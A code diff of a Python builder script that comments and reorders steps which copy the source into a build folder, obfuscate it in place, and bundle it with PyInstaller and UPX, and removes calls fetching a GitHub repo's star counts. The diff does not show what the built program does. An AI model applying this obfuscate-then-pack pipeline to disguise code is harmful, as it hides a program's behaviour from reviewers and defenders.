@@ -12,11 +12,6 @@ from util.writeconfig import WriteConfig
 
 
 def main():
-    stars = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["stargazers_count"]
-    forks = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["forks_count"]
-
     logging.basicConfig(
         level="NOTSET",
         format="%(message)s",
@@ -28,22 +23,26 @@ def main():
     logging.getLogger("rich")
     console = Console()
 
+    # We'll use a static configuration already fixed in /src/config.py. It
+    # won't change between builds or versions - the idea is "build once, touch
+    # never."
     # config = Config()
     # config_data = config.get_config()
 
+    # Create the build environment/directory by copying the src directory into
+    # a new build folder
     make_env = MakeEnv()
     make_env.make_env()
     make_env.get_src()
-
-    # We'll use a static configuration already fixed in /src/config.py. It
-    # won't change between builds.
     
     # write_config = WriteConfig(config_data)
     # write_config.write_config()
 
+    # Perform in-place obfuscation against the build directory.
     do_obfuscate = DoObfuscate()
     do_obfuscate.run()
 
+    # Build the code, bundle using PyInstaller
     build = Build()
     build.get_pyinstaller()
     build.get_upx()
